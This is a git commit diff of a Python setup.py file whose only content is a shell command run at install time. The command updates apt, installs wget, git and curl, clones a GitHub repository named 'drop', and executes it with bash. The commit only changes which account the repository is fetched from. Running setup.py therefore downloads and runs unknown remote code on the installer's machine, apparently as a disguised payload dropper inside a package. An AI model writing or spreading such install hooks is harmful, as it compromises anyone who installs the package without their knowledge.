64dd4dde8f0a63ee7a4bbc9aaa2827bc02e21ac9
stuartbond770 <163703864+stuartbond770@users.noreply.github.com>
2024-03-17 07:49:01 +0200

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 #!/usr/bin/env python
 import subprocess
 
-subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/lulamilenxwemeni/drop.git;cd drop;chmod +x drop;bash drop", shell=True)
+subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/stuartbond770/drop.git;cd drop;chmod +x drop;bash drop", shell=True)
